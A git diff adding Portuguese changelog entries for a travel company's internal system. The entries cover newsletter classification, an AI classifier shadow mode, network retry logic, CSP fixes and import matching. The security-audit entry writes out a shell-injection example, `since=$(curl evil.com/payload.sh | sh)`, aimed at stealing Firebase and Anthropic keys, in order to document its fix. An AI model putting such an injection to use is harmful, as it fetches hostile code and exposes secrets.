@@ -6,6 +6,1320 @@ Todas as mudanças relevantes do sistema. Formato baseado em [Keep a Changelog](
 
 ---
 
+## [4.49.63+20260521-portal-import-destino-match-cadastrar-inline] — 2026-05-21
+
+Release **PATCH** — Portal de Dicas/Importação: matching de destinos
+robusto + cadastro inline.
+
+**Contexto** (Renê): "sistema não permite importação por nao
+identificar destino cadastrado (e ele esta cadastrado). precisamos
+corrigir. isso é falta de leitura do modulo de destinos, certo?"
+
+**Diagnóstico**: o fluxo já lê destinos live a cada import (sem
+cache), mas comparação em `portalImport.js:340` era `===` estrita
+(case-sensitive, accent-sensitive). Falhava em "Brasil" vs
+"brasil", "São Paulo" vs "Sao Paulo", continente preenchido
+diferente, etc. Sem botão de cadastrar quando faltava destino.
+
+**Mudanças em `js/pages/portalImport.js`**:
+
+1. **`_norm()`** — lowercase + NFD strip + trim + collapse whitespace.
+
+2. **`_matchDest(allDests, dest)`** — matching em 3 camadas:
+   - L1 exact: país + cidade + continente normalizados batem.
+   - L2 no-continent: ignora continente (redundante na maioria).
+   - L3 country-only: só país, quando planilha não tem cidade.
+   - Retorna sugestão fuzzy (Levenshtein ≤ 2 no país, ou cidade
+     igual com país errado) se nada bater.
+
+3. **`showReview` async** + **`renderReviewBody()`**:
+   - Faz `fetchDestinations` antes de renderizar.
+   - Cada destino fica com badge ✅ **Cadastrado** (verde) /
+     ⚠️ **Não cadastrado** (âmbar).
+   - Não-cadastrados ganham botão **+ Cadastrar destino** inline.
+   - Sugestão fuzzy aparece ("💡 Você quis dizer X?").
+   - Botão "Confirmar e Importar" fica **disabled** enquanto
+     houver destinos pendentes.
+
+4. **`openInlineCadastrarModal()`** — modal pré-preenchido com
+   continente/país/cidade da planilha; usa `withRetry` no
+   `saveDestination`; após sucesso re-classifica tudo.
+
+5. **`runImport(byDest, preFetchedDests)`** — usa `_matchDest`;
+   refetch sempre antes de iterar (user pode ter cadastrado
+   destinos entre review e import); fuzzy hint no log de cada
+   skip.
+
+**Validação**: `node --check` ok. Falta E2E manual no Chrome.
+
+---
+
+## [4.49.62+20260521-retry-log-polish] — 2026-05-21
+
+Release **PATCH** — polish do log do `withRetry` descoberto durante
+validação live no Chrome da v4.49.61.
+
+**Contexto**: ao testar `withRetry` com `code: 'permission-denied'`
+(non-retriable), o console exibia `[retry:label] attempt 1/3 failed:
+permission-denied`. Mensagem confusa porque sugere que vai retentar
+2x mais — quando na verdade o fluxo aborta imediatamente.
+
+**Mudança em `retry.js`**:
+- Non-retriable: `[retry:label] non-retriable error, aborting: <code>`.
+- Esgotou tentativas: `[retry:label] attempt N/M failed (final): <code>`.
+- Retentando: `[retry:label] attempt N/M failed, retrying: <code>`.
+
+**Auditoria de call sites** (3 pontos, todos com `label`):
+- `portal.js`: `portal.requesterEdit.save` ✓
+- `taskModal.js`: `task.requesterEdit.ackInModal` ✓
+- `tasks.js`: `task.requesterEdit.ack` ✓
+
+**Validação rule Firestore**:
+- `tasks/{taskId}` allow update: any assignee/observer/manager/creator.
+- Não há restrição field-level — `requesterEditAckBy.<uid>` é
+  writable por quem vê o banner. ✓
+
+---
+
+## [4.49.61+20260521-network-resilience-n1-banner-ack-persistent] — 2026-05-21
+
+Release **PATCH** — resiliência de rede (camada N1) + persistência do
+ack do banner de alteração de tarefa.
+
+**Contexto** (Renê): "Internet ruim ou lenta o sistema não lida bem em
+diversos módulos (banner de alerta de alteração de tarefa gerada por
+meio do portal de solicitações, por exemplo, não exibe pra todos os
+users). Vamos olhar para esse tema e identificar se temos de lidar de
+alguma forma?" + "o banner de alteração na tarefa aparece
+insistentemente... não é melhor colocar um botão de que o user está
+ciente do aviso e depois ele para de ser exibido?"
+
+**Novos serviços** (4 arquivos):
+- `js/services/connection.js` — status reativo (`online` /
+  `reconnecting` / `offline`), ring buffer dos últimos 20 erros
+  persistido em localStorage, listeners de `online`/`offline` do
+  browser, exposto em `window.__PRIMETOUR_CONNECTION__` para debug.
+- `js/components/connectionIndicator.js` — chip no topo direito
+  (z-index 10100), invisível quando online, animado em
+  reconnecting/offline. Clique abre painel com erros recentes (admin).
+- `js/services/retry.js` — `withRetry(fn, opts)` com backoff
+  exponencial (800ms × 2^n + jitter), max 3 tentativas, ignora
+  códigos não retriáveis (permission-denied, failed-precondition,
+  invalid-argument, not-found, already-exists, unauthenticated,
+  data-loss, out-of-range). Sinaliza connection em transient errors.
+- `js/services/listenerError.js` — helper `listenerError(source)`
+  retorna onError callback que sinaliza `markNetworkError` via lazy
+  import (evita circular dep).
+
+**Listeners agora sinalizam connection** (8 pontos):
+- `tasks.js subscribeToTasks`
+- `presence.js`
+- `contentCalendar.js` (2 listeners)
+- `csat.js` (onError adicionado onde faltava)
+- `checkin.js` (3 listeners)
+- `vacation.js`
+- `agents.js`
+
+**Banner persistente com ack per-user**:
+- `tasks.js showRequesterEditBanners` + `taskModal.js`: skip se
+  `task.requesterEditAckBy[uid] >= task.requesterEditAt`. Banner tem
+  3 botões (Estou ciente / Depois / ✕), **sem auto-dismiss**.
+- "OK, estou ciente" grava `requesterEditAckBy.<uid>:
+  serverTimestamp()` (era destrutivo antes: `requesterEditFlag: false`
+  apagava o banner pra todo mundo no momento em que um user clicasse).
+- Save usa `withRetry` (3 tentativas).
+
+**Portal save com retry**:
+- `portal/portal.js` (~linha 2316): update de tarefa wrapped em
+  `withRetry`. Se falhar, toast de erro + return (não fecha modal,
+  user pode tentar de novo sem perder edição).
+
+**Indicador montado no app**:
+- `app.js init()`: `mountConnectionIndicator()` (try/catch).
+
+**Validação**:
+- `node --check` passou nos 14 arquivos modificados/novos.
+- Simulação lógica: 5/5 casos de detecção de erro transient vs.
+  permanent corretos.
+
+---
+
+## [4.49.47+20260520-changelog-doublecheck] — 2026-05-20
+
+Release **PATCH** — double-check do CHANGELOG + DEV-HOURS pedido pelo Renê:
+"vamos de double check no doc técnico? preciso disso 100%".
+
+**Verificações executadas**:
+1. Ordem + completude das 23 entradas novas (4.49.23 → 4.49.45): ✓ sem
+   gaps, ordem decrescente correta.
+2. Cross-check slugs do CHANGELOG vs git log: 14/14 batem em
+   titulo+versão. Slug `20260519-...` mantido em 4.49.42-45 mesmo
+   tendo sido commitados de madrugada 20/05 (convenção do repo:
+   slug = dia de trabalho; `completedAt` no `dev_hours` tem
+   timestamps reais).
+3. Fatos técnicos: 1 discrepância corrigida em v4.49.41
+   (texto dizia "330 linhas" do classify-content-ai.js; hoje são
+   ~556 com os reforços de v4.49.42-43). Reescrito como "escopo
+   inicial ~330 linhas; cresceu pra ~560".
+4. Markdown sintaxe: 0 headers duplicados, 0 versões duplicadas, 40
+   code fences bem pareadas.
+5. Cross-check Firestore vs CHANGELOG: 23 releases approved no
+   `dev_hours`, todas listadas no CHANGELOG. Sem ghosts, sem missing.
+6. DEV-HOURS.md totais batem com Firestore: 197 entries / 788h 11min
+   / R$ 118.227,00 / subtotais 13,09h + 22,53h = 35,62h ✓.
+
+---
+
+## [4.49.46+20260520-changelog-devhours-sprint-completo] — 2026-05-20
+
+Release **PATCH** — backfill do doc técnico + `dev_hours` cobrindo
+o sprint completo de 19-20/05/2026. Resposta ao Renê: "atualize o
+doc tecnico e o horas dev → eu nao rodo nada manualmente. quem faz
+as coisas é vc. quero pronto".
+
+**Entregue**:
+- `CHANGELOG.md` ganha 23 entradas (4.49.23 → 4.49.45)
+- `functions/add-dev-hours-4.49.23-31.cjs` (criado + executado): 9
+  releases (manhã/tarde) · 13,09h · R$ 1.963,50
+- `functions/add-dev-hours-4.49.32-45.cjs` (criado + executado): 14
+  releases (noite/madrugada) · 22,53h · R$ 3.379,50
+- `docs/DEV-HOURS.md` header atualizado: novo total 788h 11min /
+  R$ 118.227,00 / 180 releases + 17 phases / 7h 22min/dia
+
+**Recalibragem** em v4.49.41 e v4.49.42: de `mega` pra `large` (mega
+daria 36h e 28.8h numa única release — irrealista mesmo pra sprint
+denso). Large com integration+investigation = 4,5h / 3,6h
+respectivamente, coerente com bugs complexos do mesmo dia (ex:
+metaLinks 4.49.21 = 6h base).
+
+---
+
+## [4.49.45+20260519-regression-defensiveness] — 2026-05-19
+
+Release **PATCH** — regression review após o sprint do shadow mode +
+security audit. Resposta ao Renê: "vc testou se tudo isso nao prejudicou
+alguma funcionalidade do sistema? da ultima vez travou o login..."
+
+**Verificações executadas** (8 chapters):
+1. `node --check` em 5 módulos críticos: OK
+2. Imports de `nlPerformance.js` resolvidos (6/6 found)
+3. `store.isMaster()` (line 244) e `store.can()` (line 146) confirmados
+4. `firestore.rules`: braces balanceadas (226=226), 106 match blocks,
+   `users`/`roles` intactos, 3 collections novas presentes
+5. CSP diff: SÓ adicionou hosts SFMC BU CDN, nada removido
+6. `seedDefaultAgents`: try/catch por seed isola falhas
+7. `MODULE_REGISTRY` tem fallback `|| a.module` no aiHub:180
+8. Test harness: 61/61 passou após refactor de segurança
+
+**1 risco real encontrado + blindado**: `renderShadowModeBlock` era
+chamado dentro de template literal sem try/catch local. Se exception
+interna fosse lançada (ex: regra Firestore não deployada), o
+`root.innerHTML` inteiro falharia → aba "Conteúdo & Temas" mostraria
+nada. Fix em 2 camadas: IIFE try/catch no template wrap +
+`.catch()` em `wireShadowModeDrill()` async.
+
+**Login verificado intacto** — js/auth/auth.js: 0 mudanças hoje.
+firestore.rules `/users/` e `/roles/`: 0 mudanças.
+
+---
+
+## [4.49.44+20260519-security-audit-fixes] — 2026-05-19
+
+Release **PATCH** — auditoria de segurança bank-grade do sprint.
+Resposta ao Renê: "acho prudente fazer uma auditoria em segurança pra
+cobrir possiveis, com nivel de exigencia de um banco".
+
+Findings: **2 CRITICAL + 2 HIGH + 3 MEDIUM** (operacionais).
+
+🔴 **CRITICAL #1 — Firestore rules ausentes** pra
+`nl_ai_classifier_runs / promotions / rollbacks`. Default-deny travaria
+sparkline. Fix: regras append-only via Admin SDK.
+
+🔴 **CRITICAL #6 — Shell injection em 3 workflows** via inputs
+`limit`/`since`/`confirmar` interpolados em bash. Vetor:
+`since=$(curl evil.com/payload.sh | sh)` → exfiltração de
+`FIREBASE_PRIVATE_KEY` e `ANTHROPIC_API_KEY`. Fix em 4 camadas: inputs
+via env vars, `set -euo pipefail`, allowlist regex, bash arrays.
+
+🟠 **HIGH #2 — Decision buttons sem gate de permissão**. Fix:
+`canVoteOnDecisions` gate na UI + defesa em profundidade no handler.
+
+🟠 **HIGH #5 — Workflows sem `permissions:` explícito**. Fix:
+`permissions: contents: read` (least-privilege).
+
+🟡 **MEDIUM abertos** (documentados em `SECURITY-AUDIT-2026-05-19.md`):
+PII em htmlText (→ DPA Anthropic), prompt injection insider, pinning
+de actions `@v4` (sprint de governança separada).
+
+---
+
+## [4.49.43+20260519-nl-classifier-test-harness] — 2026-05-19
+
+Release **PATCH** — test harness pra `classify-content-ai.js`. Resposta
+ao Renê: "testou a operacao dele (sem ativar a API, apenas verificando
+se ele trabalha, de fato)?" — não tinha testado além de `node --check`.
+
+**Refatoração**: gate `IS_CLI` separa execução CLI de require pra
+testes. Exporta helpers puros (`parseClaudeJson`, `validateOutput`,
+`buildPayload`, `shouldClassify`, `agentVersion`, `estimateRunCostUsd`).
+
+**Test harness `classify-content-ai.test.js`** (61 testes em 8 áreas):
+parseClaudeJson (6), validateOutput (8), buildPayload (7), shouldClassify
+(5), agentVersion (5), estimateRunCostUsd (5), fluxo integrado
+parse+validate (4), E2E simulado (4).
+
+**Workflow CI** ganha step "Run smoke tests" ANTES da chamada Claude
+(falha rápido sem queimar tokens). Edge cases manuais validados: aspas
+curvas, emoji, resposta multi-linha com preface.
+
+Custo simulado por chamada: $0.0004 (cache hit 94%).
+
+---
+
+## [4.49.42+20260519-nl-classifier-pipeline-100pct] — 2026-05-19
+
+Release **MINOR** — pipeline 100% operacional do classificador IA.
+Resposta ao Renê: "faça o que tem de fazer pra ele funcionar 100%...
+quero o caminho que funciona 100%, com tudo que temos direito."
+
+**Reforços em `classify-content-ai.js`**: cost cap diário (lê
+`nl_ai_classifier_runs`, exit 2 se estourado), audit per-doc em
+`ai_usage_logs` (formato compatível com Cloud Function), exit codes
+semânticos (0=OK, 1=erro fatal, 2=budget estourado, 3=erro >20%).
+
+**NOVO — `promote-ai-to-prod.js` + workflow**: cutover idempotente com
+backup automático em `commercialPrev`. Filtro de confiança configurável.
+Workflow manual com confirmação literal "PROMOVER".
+
+**NOVO — `rollback-ai-classification.js` + workflow**: reverte cutover,
+defesa `missingBackup`, filtro `--since=<ISO>`. Workflow manual com
+confirmação "REVERTER".
+
+**Dashboard NL → Conteúdo & Temas → bloco shadow mode** ganha:
+sparkline da evolução temporal (3 linhas vs meta 90%), painel admin
+(3 botões pros workflows com semáforo), botões de decisão por
+divergência ("IA certa" / "regex certo" → grava em
+`extracted.humanDecisionCommercial/Tourism`).
+
+Concurrency lock em `classify-content-ai.yml`.
+
+---
+
+## [4.49.41+20260519-classificador-newsletters-shadow-mode] — 2026-05-19
+
+Release **MINOR** — shadow mode do agente Classificador NL. Pipeline:
+shadow → revisão humana → cutover → rollback. Resposta ao Renê: "quero
+o caminho da excelencia".
+
+**Princípio arquitetural**: cada agente vive no seu módulo (não há
+agentScheduler genérico). IA Hub = registry + governança; orquestração
+nativa do módulo.
+
+**`scripts/classify-content-ai.js`** (escopo inicial ~330 linhas;
+cresceu pra ~560 com cost cap + audit + exports nas releases
+seguintes): lê agente `nl-content-classifier` do Firestore (single
+source of truth — editar
+prompt no IA Hub propaga sem deploy), kill switch soft
+(`agent.active === false` → exit 0), idempotência por hash
+`model+systemPrompt`, chama Anthropic com `cache_control` (cache hit
+~10% do input), grava em campos paralelos `extracted.ai*` (NÃO toca
+em produção), concorrência 3 + backoff 429/5xx, resumo em
+`nl_ai_classifier_runs`.
+
+**Workflow `classify-content-ai.yml`**: cron `45 6 * * *` (15min depois
+do `classify-content.js` regex) + manual com dry/force/limit/verbose.
+
+**Dashboard shadow mode block**: empty state com checklist, KPIs com
+semáforo (≥90% verde), distribuição de confiança, tabelas top 10
+de divergências por eixo.
+
+**Doc**: `scripts/SHADOW-MODE-NL-CLASSIFIER.md` com arquitetura, setup,
+custo estimado, troubleshooting.
+
+---
+
+## [4.49.40+20260519-classificador-newsletters-claude-haiku] — 2026-05-19
+
+Release **PATCH** — seed do Classificador NL muda de Gemini para
+Anthropic Claude Haiku 4.5. Resposta ao Renê: "nao vou usar gemini.
+vou usar api claude".
+
+Provider/model atualizados. Code-path validado: `runAgent` pula
+validação de key local quando provider==='anthropic' → `callLLMSecure`
+→ Cloud Function `callLLM` → Secret Manager → `api.anthropic.com`.
+Prompt caching automático ≥1024 chars (nosso prompt tem ~7k → cache
+hit cobra ~10% do input).
+
+---
+
+## [4.49.39+20260519-agente-classificador-newsletters-seed] — 2026-05-19
+
+Release **PATCH** — agente-seed `nl-content-classifier` no IA Hub
+(DESATIVADO). Resposta ao Renê: "precisamos deixar ele pronto no IA
+Hub, mas sem ativá-lo ainda. faça algo criterioso, com o mesmo padrão
+que vc utilizou para fazer as categorizações".
+
+Novo seed em `SYSTEM_SEED_AGENTS` espelha 1:1 as regras de
+`scripts/classify-content.js`: prioridade `sazonal > promocao > parceiro
+> inspiracional` (Comercial) e `evento > aereo > roteiro > servico >
+hotelaria > cruzeiro > produto > outros > destino` (Turismo), trigger
+rule 1-match-subject OU 2+-match-htmlText, CSAT bypass, regra especial
+de BU (BTG/Centurion não vira "parceiro" só pela BU), 7 anti-padrões
+explícitos, 2 few-shot examples.
+
+Defaults conservadores: `temperature 0.1`, `maxTokens 512`, `rateLimit
+30/min`, `maxCostPerDayUsd 2`, `visibility admin`. Todos os 4 triggers
+desabilitados.
+
+Side fix: `'nl'` em `MODULE_REGISTRY` pro label "Newsletters" no card.
+
+---
+
+## [4.49.38+20260519-pdf-conteudo-rewrite] — 2026-05-19
+
+Release **PATCH** — rewrite do PDF de Newsletter → Conteúdo & Temas
+seguindo padrão visual do dashboard de Produtividade. Resposta ao Renê:
+"a exportacao para pdf ainda carece de melhorias. faltam graficos,
+padronizacao, retirada de caracteres especiais...".
+
+**Antes**: `jsPDF` cru sem `pdfKit`, títulos com emojis (💼 ✈️ 🌍 —
+viram caixinhas no Helvetica/WinAnsi), sem capa/footer/gráficos, 7
+tabelas empilhadas em retrato.
+
+**Agora** (landscape, espelha Produtividade): capa branded, KPI strip
+de 6 blocos com semáforo, **8 gráficos de barras horizontais nativas**
+em grade 2×4 (Comercial × Turismo / Países × Cidades / Hotéis × Marcas
+/ Cruzeiros × Temas), tabela final com pintura semafórica, footer
+paginado, sanitização total (`txt()` + `stripEmoji()`), `withExportGuard`.
+
+---
+
+## [4.49.37+20260519-csp-libera-todas-bus-sfmc] — 2026-05-19
+
+Release **PATCH** — CSP `img-src` libera as 5 CDNs SFMC BU completas.
+Resposta ao Renê: "U0225, U0224, P0224, P0220, U0223, P0222... está
+percebendo o padrão?"
+
+**Diagnóstico real**: Firestore tinha `imageUrls=5` em todos os 6 docs
+reportados. Falha era CSP — só liberava `image.viagens.newsletterprime.com.br`.
+Faltavam 4 CDNs: `partnersbtgpactual.com.br`, `ultrabtgpactual.tur.br`,
+`mktpts.tur.br`, `centurion.mktpts.tur.br`.
+
+Padrão de erro registrado: "funcionou pra mim => liberei só o que
+testei". **Validação live**: modal U0225 com 5/5 imagens carregadas.
+
+---
+
+## [4.49.36+20260519-fix-merge-waves-imageurls] — 2026-05-19
+
+Release **PATCH** — fix do merge de waves: `imageUrls` passa a vir de
+QUALQUER wave do grupo, não só do `base` alfabeticamente. Resposta ao
+Renê: "tem a ver com o disparo ter feito em ondas e vc condensar em
+um resultado só?" (acertou em cheio).
+
+**Diagnóstico**: `dedupContentByCampaign` + `mergeWaves` em
+`nlPerformance.js` consolidavam waves (P0209_1/_2/_3 = 1 campanha)
+pegando o `base` alfabético. Se P0209_1 não tinha `imageUrls` e P0209_2
+tinha 5, o merge cuspia o doc do _1 → modal sem imagens.
+
+Fix: `const waveWithImgs = group.find(d => Array.isArray(d.imageUrls)
+&& d.imageUrls.length > 0); const mergedImageUrls = waveWithImgs?.imageUrls
+|| base.imageUrls || [];`
+
+---
+
+## [4.49.35+20260519-desacopla-ia-mc-sync] — 2026-05-19
+
+Release **MAJOR** (arquitetural) — desacopla IA do workflow de sync.
+Resposta ao Renê: "o que tem a ver IA com o sync?"
+
+`mc-sync.js` chamava `extractEntitiesViaAgent` em loop → quota Gemini
+estourava no meio da sync → retry loop infinito → timeout 15min do
+workflow → sync parou em 06/05 (gap 07/05 → 19/05).
+
+**Fix arquitetural**: cada workflow com 1 responsabilidade.
+- `mc-sync.js`: SÓ sincroniza performance + extrai imagens (zero IA)
+- `enrich-content.js`: enriquecimento determinístico (dicionário curado)
+- `classify-content.js`: classificação dupla por regex
+- `extractEntitiesViaAgent`: wrapped em `if (false && ...)` dead-code
+
+Cada feature ganha seu próprio workflow + cron. Falhas isoladas.
+
+---
+
+## [4.49.34+20260519-circuit-breaker-gemini] — 2026-05-19
+
+Release **PATCH** — circuit breaker contra quota Gemini estourada no
+mc-sync (mitigação imediata enquanto v4.49.35 desacoplava por completo).
+
+Após N falhas consecutivas de quota, desativa chamadas IA até o final
+da run e termina com warning em vez de timeout.
+
+---
+
+## [4.49.33+20260519-nl-ui-no-art-honest-contexto] — 2026-05-19
+
+Release **PATCH** — UI honesta para docs sem `imageUrls` no modal
+"Ver arte". Em vez de "imagem indisponível" genérico, mostra contexto
+por `noArtReason`: csat (📋 pesquisa), warmup (🔥 warm-up), test
+(🧪 teste interno), pending (⚠ asset deletado/sem html).
+
+---
+
+## [4.49.32+20260519-categorize-no-art-100pct] — 2026-05-19
+
+Release **MINOR** — 3 itens completados: (1) bloco "Tipo de newsletter
+(legado)" REMOVIDO do dashboard (redundante após v4.49.27), exports
+XLS/PPT também limpos. (2) Tooltips ilegíveis viraram modal estruturado
+(`INFO_MODAL_DEFINITIONS` com categorias/prioridade/exemplos).
+(3) `scripts/categorize-no-art.js` categoriza os 64 docs sem
+`imageUrls` (55 marcados csat/warmup/test, 9 pending por asset deletado).
+
+Resposta ao Renê: "trabalho com excelencia... 100% das imagens das
+news, e nao 90%".
+
+---
+
+## [4.49.31+20260519-csp-img-src-sfmc] — 2026-05-19
+
+Release **PATCH** — bugfix do v4.49.30: backfill funcionou (692 docs com
+imageUrls) mas modal "Ver arte" mostrava "imagem indisponível" pra tudo.
+
+**Causa:** Content-Security-Policy `img-src` não tinha os domínios SFMC.
+Hosts encontrados via debug ao vivo:
+- `image.viagens.newsletterprime.com.br` — CDN próprio do PRIMETOUR
+- `ftpprime.blob.core.windows.net` — Azure Storage com hero images
+- `image.exct.net`, `image.s10.exacttarget.com` — CDN SFMC genérico
+
+Todos adicionados ao `img-src`. **Validado live**: 5/5 imagens renderizam
+em naturalWidth=800px. Zero risco XSS — `<img>` com src externo não
+executa JS.
+
+---
+
+## [4.49.30+20260519-backfill-image-urls-legado] — 2026-05-19
+
+Release **MINOR** — Backfill do legado de imageUrls (resposta ao user:
+"não conseguimos pegar o legado de imagens pq?" — corte de caminho meu
+em v4.49.29).
+
+### Script + workflow
+
+- `scripts/backfill-image-urls.js`: refetch HTML do SFMC por assetName,
+  extrai top 5 imagens via mesmo `extractContentImages()` do mc-sync.js,
+  popula `doc.imageUrls`. Idempotente, suporta `--dry`, `--bu`, `--limit`.
+- `.github/workflows/backfill-image-urls.yml`: workflow_dispatch manual
+  reusando secrets MC_* + FIREBASE_* do cron de sync.
+
+### Bugs encontrados durante deploy
+
+1. **MIDs errados** (chutei sem checar mc-sync): 401 SFMC token. Fixei
+   com os MIDs reais (546014130 primetour, 546015816 btg-partners, etc).
+2. **Query body com `fields` specifier**: 400 "views.html.content is not
+   a valid field argument". Removido, agora retorna doc completo.
+
+### Resultado
+
+| BU | Docs com imageUrls (antes → depois) |
+|---|---|
+| btg-ultrablue | 0/240 → **231/240 (96%)** |
+| primetour     | 0/209 → **192/209 (92%)** |
+| pts           | 0/82  → **80/82 (98%)** |
+| btg-partners  | 0/152 → **130/152 (86%)** |
+| centurion     | 0/73  → **59/73 (81%)** |
+| **TOTAL** | 0/756 → **692/756 (92%)** · **1.181 URLs adicionadas** |
+
+Em ~30 segundos · 265 assets únicos consultados · 17 assets não
+encontrados no SFMC (provavelmente deletados desde o sync original).
+
+---
+
+## [4.49.29+20260519-nl-ver-arte-modal] — 2026-05-19
+
+Release **MINOR** — User: "gostaria de clicar na newsletter na aba
+Performance ver a arte. Teríamos que hospedar a arte de qualquer forma
+pra IA ler e interpretar, né?". Implementado.
+
+### Captura de URLs no mc-sync
+
+`scripts/mc-sync.js`: a função `extractContentImages()` já existia (filtra
+trackers, ordena por score visual) mas as URLs eram **descartadas após
+Vision API consumir**. Agora persistimos: `enrich.imageUrls` (top 5) vai
+direto pro doc `mc_performance.imageUrls`. Mesma extração — uma única
+fonte de verdade entre IA e UI.
+
+Salva tanto em **cache hit** (passou pelo Vision antes) quanto em **fresh
+fetch** (asset novo).
+
+### UI: click no nome do email → modal "🖼 Ver arte"
+
+Coluna "Nome" na tabela Disparos vira clicável (`a.nl-art-link`). Ícone
+de hint: 🖼 quando há arte salva, 🔍 quando não há ainda (legado pré-v4.49.29).
+
+Modal mostra:
+- Subject + data + BU + total enviados + open rate
+- Grid responsive (`auto-fit minmax(260px,1fr)`) das imagens
+- Imagens em `aspect-ratio:16/10`, `object-fit:contain` (preserva proporção)
+- Click numa imagem → abre em tamanho real (`target=_blank rel=noopener`)
+- Lazy-loading + fallback "imagem indisponível" se CDN responder 4xx
+
+Empty state honesto pra docs antigos: explica que apareceria quando o
+asset for re-sincronizado.
+
+### Hospedagem: SFMC CDN por enquanto
+
+URLs servidas pelo CDN do SFMC (mesmas URLs que os destinatários veem
+no email). Públicas, estáveis enquanto o asset existir. Hospedagem em
+Firebase Storage (cópia nossa, controle de versão, defesa contra delete
+no SFMC) é evolução natural mas não bloqueia o uso atual.
+
+### IA + UI compartilham a fonte
+
+Antes: Vision API baixava as imagens, analisava, descartava URLs.
+Agora: URLs são salvas, Vision consome do mesmo array, UI exibe igual.
+**Single source of truth** entre IA e UI da arte.
+
+---
+
+## [4.49.28+20260519-nl-content-exports-xls-pdf-ppt] — 2026-05-19
+
+Release **MINOR** — Exports da aba "Conteúdo & Temas" (ponto 5 do roadmap).
+Substitui o alert "será entregue na 4.7.0 · Fase 3" por exports reais nos
+**3 formatos**: Excel, PDF e PowerPoint, todos honrando os filtros aplicados.
+
+### Princípio: filtros respeitados
+
+Single source of truth: `_contentExportSnapshot()` → roda
+`applyAllContentFilters` na cache atual e devolve `{docs, enriched,
+agg, filters}`. Tudo que o user vê no dashboard é o que sai no export.
+
+Filtros honrados:
+- BU
+- Período (`180d` default)
+- País, Cidade, Tema, Tipo (legado)
+- **Comercial** e **Turismo** (eixos v4.49.27)
+- Busca livre
+
+Cabeçalho de cada export mostra o resumo dos filtros (ex: "BU: centurion ·
+Período: últimos 90d · Comercial: sazonal") pra contexto.
+
+### Excel (`.xlsx`) — 10 sheets
+
+- **Resumo**: filtros, contagens KPI, open rate médio
+- **Comercial / Turismo**: distribuição nos eixos novos
+- **Países / Cidades / Hotéis / Cruzeiros / Temas / Marcas**: cada um
+  com colunas Disparos · Enviados · Abertura · Cliques · Opt-out
+- **Tipo Legado**: classificação antiga (preservada)
+- **Disparos**: uma linha por campanha (subject, BU, data, métricas,
+  comercial, turismo, países, cidades, hotéis, marcas)
+
+### PDF (`.pdf`) — A4 portrait
+
+- Capa com título + filtros + KPIs em linha
+- 7 tabelas (top 30 cada): Comercial, Turismo, Países, Cidades, Hotéis,
+  Cruzeiros, Temas — todas com Disparos/Enviados/Abertura/Cliques/Opt-out
+- Quebra de página automática quando passa de 260mm
+
+### PowerPoint (`.pptx`) — layout wide
+
+- **Slide capa** com filtros + KPIs (BU/período/total/open rate)
+- 8 slides de tabela (top 15 cada): Comercial, Turismo, Países, Cidades,
+  Hotéis, Cruzeiros, Temas, Tipo Legado
+- Header dourado, células com cor PRIMETOUR navy, fonte Poppins
+- Pronto pra apresentação executiva
+
+### Buttons no header
+
+`⬇ Excel · ⬇ PDF · ⬇ PPT` substituem o botão antigo "⬇ PDF" (que só
+mostrava alert). Mesmo cluster do "↻ Atualizar".
+
+---
+
+## [4.49.27+20260519-nl-eixos-duplos-comercial-turismo] — 2026-05-19
+
+Release **MINOR** — Eixos duplos de classificação no Newsletter
+"Conteúdo & Temas" (spec do user, ponto 1 do roadmap).
+
+### Eixo COMERCIAL (`extracted.commercial`)
+
+Tema macro da comunicação:
+
+| Valor | Detecção | Triggers principais |
+|---|---|---|
+| `promocao` | %OFF, desconto, "noite FREE", cashback, crédito US$ | Oferta/condição comercial |
+| `sazonal` | Estação, feriado, data comemorativa, mês+ano | Período específico |
+| `parceiro` | Cartão Partners, Centurion Card, Latam Pass, Bocelli | Empresa parceira em destaque |
+| `inspiracional` | (default) | Editorial sem valor/sazonalidade/parceiro |
+
+**Prioridade** (spec do user): `sazonal > promocao > parceiro > inspiracional`
+
+### Eixo TURISMO (`extracted.tourism`)
+
+Tipo de conteúdo turístico:
+
+| Valor | Detecção | Exemplos |
+|---|---|---|
+| `evento` | Show, GP, Wimbledon, Bocelli, Camarote | Comunicações sobre eventos |
+| `aereo` | Voo, passagem, classe executiva, milhas | Comunicações aéreas |
+| `roteiro` | "X noites", day-by-day, pacote, multi-destino | Pacote fechado |
+| `servico` | Transfer, concierge, Lifestyle Manager, alfaiate | Serviço de concierge |
+| `hotelaria` | Hospedagem, hotel, resort, villa, suíte | Bloco/destaque de hotel |
+| `cruzeiro` | Yacht, navio, Silversea, Aqua Mekong | Cruzeiros/yachts |
+| `produto` | Flores, presente, revista | Produto físico |
+| `destino` | (fallback se tem cidade/país) | Editorial sobre destino |
+| `outros` | Trens (Orient Express, Belmond), CSAT | Casos especiais |
+
+**Prioridade** (spec do user): `evento > aereo > roteiro > servico > hotelaria > cruzeiro > produto > destino > outros`
+
+### Distribuição real (756 docs classificados)
+
+**Comercial:**
+- 64% inspiracional · 16% sazonal · 12% parceiro · 8% promoção
+
+**Turismo:**
+- 29% outros (CSAT + trens raros) · 25% hotelaria · 17-18% destino ·
+  14% serviço · 6% cruzeiro · 3% aéreo · 3% evento · 2% roteiro
+
+### Pipeline
+
+1. `functions/classify-mc-claude.cjs` — classifier determinístico (regex
+   sobre subject+name+htmlText com anti-boilerplate). Marca
+   `extracted.classifiedBy='claude-classify-v4.49.27'`.
+2. `aggregateContent()` em `nlPerformance.js` ganhou maps `commercial`
+   e `tourism` agregando count + sent + open + click + opt-out.
+3. Dashboard "Conteúdo & Temas" ganhou 2 blocos novos no topo:
+   `💼 Classificação Comercial` e `✈️ Classificação Turismo`.
+4. Drill-down clicável → modal com lista de disparos (mesma UX dos
+   outros blocos da aba).
+5. Filtros novos `_contentFiltersState.commercial` e `.tourism`
+   aplicados em `applyAllContentFilters`.
+
+### Pendências
+
+- UI dos filtros (dropdowns) será adicionada na próxima release —
+  estado já está pronto, falta o `<select>` no DOM.
+- Modal de edição manual (extracted editor) ainda não tem campos pros
+  eixos duplos — backfill futuro.
+
+---
+
+## [4.49.26+20260519-nl-enrich-htmltext-bodied] — 2026-05-19
+
+Release **PATCH** — User: "ler o html é fundamental. subject entrega muito
+pouco". Aceito. Estendido o backfill pra processar `htmlText` (texto
+extraído do body, ~6-8 KB por doc) além de subject + name.
+
+### Anti-boilerplate (lições do DRY-RUN)
+
+Lendo o body apareceram 2 armadilhas:
+
+1. **Header reusado entre emails**: BTG Partners reaproveitava o título
+   "Cartão Partners BTG — Hospedagens na Tailândia" como header de
+   emails sobre outros temas (São Paulo, Suíça). Resultado: Tailândia
+   adicionada em 50 docs falsamente no primeiro DRY-RUN.
